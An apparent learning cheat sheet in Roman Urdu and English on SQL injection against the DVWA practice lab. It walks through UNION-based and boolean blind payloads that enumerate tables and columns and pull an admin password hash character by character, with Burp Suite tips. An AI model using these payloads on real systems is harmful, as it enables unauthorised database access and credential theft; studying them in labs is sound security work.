### Basic payload for checking website is vulnerable or not

 `'`

 `"`

 `#` 

---

### Checking How many Columns

` ' ORDER BY 1--`

` ' ORDER BY 2--`

` ' ORDER BY 3--`

Jahan pr website main error ajaye jaisy ` ' ORDER BY 3--` pr too iska matlab 2 columns hain.

### Alternative Method for Checking Columns

` ' UNION SELECT NULL-- `

` ' UNION SELECT NULL,NULL-- `

` ' UNION SELECT NULL,NULL,NULL-- `

Agar ` ' UNION SELECT NULL,NULL-- ` aany pr website py yeh display hoo jaye or baki dono pr error aye too phir yani 2 columns hain.

---

### Checking which column contain text data

` ' UNION SELECT 'abc',NULL,NULL-- `

` ' UNION SELECT NULL,'abc',NULL-- `

` ' UNION SELECT NULL,NULL,'abc'-- `

Jab yeh pata chal jaye ky website main kitny columns hain too iusky baad ka step yeh check krna hota hai ky kis column main text data jaa rha hai isky liye yeh oper wali sub combinations try ki jati hain jis combination pr error na aye yani iusky andar text data jaa rha hai or iusi column sy hum data retrive krty hain.

---

### Checking Table Name

` ' UNION SELECT NULL,table_name FROM information_schema.tables--`

Table or column name ka pata hona bht zyada zaroori hai isky baghair data retrive nhi hoo skta. Database main aik jagah hoti hai jisko information schema kehty hain wahan database ky tables or columns ki information hoti hai, isi jagah sy hum yeh information nikalty hain. Oper di gyi command sy yeh pata chalta hai ky table name kya hai lekin iss sy pehly yeh pata hona zaroori hai ky kitny columns hai oper di gyi command `2 Columns` ky hissab sy hai agar `3 Columns` hon too phir yeh command hogi

` ' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--`

Aik or baat yeh ky agar yeh command work na kare too phir column no change kiya jaa skta hai jaisy

` ' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`

---

### Checking Columns Name

` ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`

Yeh command table name find krny ky baad daali jati hai iss command sy column name ka pata chalta hai. Jab inn dono ka pata chal jaye too final command aisy banti hai

` ' UNION SELECT username, password FROM users--`

---

### Value Concatenation 

` ' UNION SELECT username || '~' || password FROM users--`

Yeh command taab use hoti hai jab table main sirf aik column hoo or iusi sy dono cheezein nikalwani hon too phir hum iss tarah username or password dono ko combine krty hain iss process ko concatenation kehty hain.

---

Yeh sub commands hi use hoti hain SQL Injection main information gathering ky liye or yeh haar database ky liye thori bht different hoo skti hain.


### Checking Database Version

If PostgreSQL

`' UNION SELECT version(), NULL--`

If MySQL 

`' UNION SELECT @@version, NULL#`

If Oracle: (Oracle mein FROM dual likhna zaroori hota hai)

`' UNION SELECT banner, NULL FROM v$version--`

### Alternative Method

`' ORDER BY 2--`
`' ORDER BY 3--`

`' ORDER BY 2#`
`' ORDER BY 3#`

`' ORDER BY 2-- `
`' ORDER BY 3-- `

---

# BLIND SQL INJECTION 

Blind SQLi main error direct show nhi hota hamy database sy questions krny hoty hain ky agar yeh cheez exist krti hai too ' AND 1=1-- main data show krdy agar cheez exist krti hai too data show hoo jata hai or ' AND 1=2-- pr kuch show nhi hota normal page load hota hai.


### (4) Basic Payloads

**(1) `' AND 1=1--`**
**(2)`' AND 1=2--`**


**(3) `1' AND 1=1#`**
**(4) `1' AND 1=2#`**

### Database ki length pata lagwana

Ab hum database se True/False wale sawal poochenge. Pehle poochna hai ke Current Database Name ki length kitni hai:

`1' AND LENGTH(database())=1#`

**(Agar page normal load hua yani lenth 1 nhi hai too isko barhain gy)**


`1' AND LENGTH(database())=2#`

**(phir normal load hua phir barhaein gy)**

`1' AND LENGTH(database())=4#`

ab agar waqai main 4 length hue too page pr kuch changing aye gi ya kuch show hoo jaye ga

### First Letter Extraction (SUBSTRING)

​Database ka pehla letter pakadne ke liye hum SUBSTRING() function use karte hain:

`1' AND SUBSTRING(database(), 1, 1)='a'#`

Agar database ka pehla letter 'a' hua, toh page bolega User ID exists in the database.

Agar database ka pehla letter 'd' ya kuch or hua, toh page bolega User ID is MISSING from the database.

`1' AND SUBSTRING(database(), 1, 1)='d'#`

**Isi tarah hum SUBSTRING(database(), 2, 1)='v' kar ke doosra letter verify karte hain**

---

### Tables Name Extract Karna using Blind SQLi
​Database mein kitne tables hain aur pehle table ka naam kya hai iuski length kya hai, yeh check karne ke liye:

`1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5#`

**Agar page normal load hoo or koi changing naa aye too matlab 5 length nhi phir isko change krna hai baar baar jaisy**

 
`1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6#`

`1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=8#`

Agar page pr koi change aye too matlab utni hi length hai.

**Table ki length pata krny ky baad kya characters hain table main yeh pata Ken ky liye payload:**

`1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1) = 'g'#`

LIMIT 0,1: Pehle table ke liye use hota hai.

​LIMIT 1,1: Doosre table ke liye use hota hai (jab pehla table complete nikal aaye).

​SUBSTRING(..., 1, 1): Pehle table ka 1st character check karega.

​SUBSTRING(..., 2, 1): Pehle table ka 2nd character check karega.

### Columns Name Extract Karna
​Table milne ke baad (e.g., users table), us ke columns check kiye jaate hain:

`1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'u'#`

(Yahan hum match karte hain ke pehla column user hai ya password).

**Agar password hai column ka naam too phir yeh payload**

`1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1), 1, 1) = 'p'#`

---

### Administrator ka Password Hash Extract Karna
​Jab hume table (users) aur column (password) ka pata chal jata hai, toh hum Admin user ka MD5 password hash ek ek character karke extract karte hain:

**Admin ke Password Hash ka Pehla Character Check:**

`1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'), 1, 1) = '5'#`

If True: Admin hash ka pehla character 5 hai.
​If False: Hum agla character (e.g., 2, a, b, 8) test karte hain.

(SELECT password FROM users WHERE user='admin'): Yeh backend database se admin user ka stored password (hash) nikalta hai.

​SUBSTRING(..., 1, 1): Yeh us password hash ka 1st character alag karta hai.

​= '5': Yeh database se puchta hai: "Kya admin ke password hash ka pehla character '5' hai?"

**Admin ke Password Hash ka Doosra Character Check:**

`1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'), 2, 1) = 'f'#`

Isi tarah Loop chala kar poore 32-character MD5 Hash (e.g., 5f4dcc3b5aa765d61d8327deb882cf99) ki exact string nikal aati hai.

Hash se real password nikalne ke liye SQL Injection use nahi hota, balki Password Cracking Tools use hotay hain.

---

## QUESTION / ANSWERS

### 1. SUBSTRING() Function Kya Hota Hai Aur Kya Karta Hai?
SUBSTRING() ka matlab hota hai **kisi poore text (string) mein se ek khas hissa ya single character alag karna**.
Is function ka format yeh hota hai: SUBSTRING(text, start_position, length)
#### Aap ke Payload Ki Misaal (1' AND SUBSTRING(database(), 1, 1)='d'#):
 * **database()**: Text jahan se character alag karna hai (maslan dvwa).
 * **Pehla 1 (2nd number par)**: start_position — yani counting kahan se shuru karni hai (1st letter se).
 * **Doosra 1 (3rd number par)**: length — yani start position se **kitne characters uthane hain**.
**3rd Number Waley 1 Ka Matlab:**
Is 3rd number wale 1 ka matlab hai ke hum **sirf 1 single character** check karna chahte hain. Agar yahan 2 likhein ge, toh yeh 2 characters uthaye ga (maslan dv). Blind SQL Injection mein hum character-by-character check karte hain, is liye yahan hamesha length 1 rakhi jati hai.


### 2. LIMIT Function Kya Hota Hai Aur Yeh Kya Karta Hai?
LIMIT clause ka kaam hota hai **Database Response ke Results Ko Control Ya Restrict Karna**.
Jab aap SQL mein query chalate hain, toh ho sakta hai database 100 rows wapas bheje. LIMIT batata hai ke kitni rows dikhani hain aur kahan se shuru karni hain.
#### Example: LIMIT 0, 1
 * **0 (Start Index)**: Row number 0 se shuru karo (pehli row).
 * **1 (Count)**: Sirf **1 row** display karo.
Agar aap LIMIT 1, 1 likhein ge, toh yeh **doosri row** ka 1 record uthaye ga. Is se hum ek ek karke alag alag tables ya usernames ka data nikalte hain.

### 3. Kya Blind SQLi Se Normal SQLi Wali Details (Tables, Version, Columns) Nahi Nikal Sakty?
**Bilkul nikal sakte hain!** Blind SQLi se bhi wahi poora data (Database Version, Table Names, Column Names, Rows, Passwords) nikalta hai jo Normal SQLi se nikalta hai.
 * **Normal SQLi:** Data direct screen par aik hi martaba UNION SELECT se print ho jata hai.
 * **Blind SQLi:** Direct data screen par nazar nahi aata, is liye hum **True/False (Yes/No)** conditions se poochna padta hai ke "Kya pehla letter 'a' hai?", "Kya pehla letter 'd' hai?". Data wahi nikalta hai, bas tareeqa-e-kar alag hota hai.

### 4. Jab Hum 1' AND 1=1# Bhejty Hain Toh Backend Par Kya Query Banti Hai?
Backend par developer ne PHP mein yeh code likha hota hai:
```
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

```
Jab aap input box mein 1' AND 1=1# daalte hain, toh $id ki jagah aap ka payload fit ho jata hai aur backend SQL query yeh banti hai:
```
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=1#';

```
#### Query Execution Breakdown:
 1. **user_id = '1'**: Database dekhta hai ke User ID 1 exist karti hai (True).
 2. **AND 1=1**: Database check karta hai ke kya 1 barabar hai 1 ke? (True).
 3. **#**: Is ne aakhir wale single quote '; ko comment (ignore) kar diya.
Kyunki dono conditions True hain, backend app response deti hai: **User ID exists in the database**.

---

### Medium Level Blind SQLi


## MOST IMPORTANT RULES:
Rule: Burp Suite Repeater mein payload daalne ke baad space aur # wali line ko highlight karke Ctrl + U dabayein (auto URL-encode karne ke liye).

**​True Response: User ID exists in the database**

### For Finding Database Length

`id=1 AND LENGTH(database())=4#`

(4, 5, 6 try karein jab tak True response na aaye).

### Database Name Character-by-Character Extract

`id=1 AND ASCII(SUBSTR(database(), 1, 1))=100#`

### Finding Table Length 

`id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=9#`

**9# ki jagah kuch sub numbers try kiye jaa skty hain jabtk response na aye nhi pata chalta length kitni hai**

**(Pehle table ke liye LIMIT 0,1, doosre table ke liye LIMIT 1,1 use karein).**

### First Table Name Character-by-Character Extract

`id=1 AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1))=103#`

### Finding Column Name Length

`id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 0,1))=7#`

**`0x7573657273` Hex version hai user-ir table ka, kiunky medium blind SQLi pr single quotes ' accept nhi hoty iss liye yeh Hex version use kiya phir isko Ctrl+U sy daba kr aik baar encode kr ky send krna hai**

**(Pehle column ke liye LIMIT 0,1, doosre column ke liye LIMIT 1,1 use karein).**

### Column Name Character-by-Character Extract

`id=1 AND ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 0,1), 1, 1))=117#`

### Finding Admin Password Hash Length

`id=1 AND LENGTH((SELECT password FROM users WHERE user='admin'))=32#`

** Note: (MD5 hash ki length hamesha 32 hoti hai iss liye yeh payload itna zaroori nhi hai).**

### Admin Password Hash Character-by-Character Extract

`id=1 AND SUBSTR((SELECT password FROM users WHERE user='admin'), 1, 1)='5'#`

---



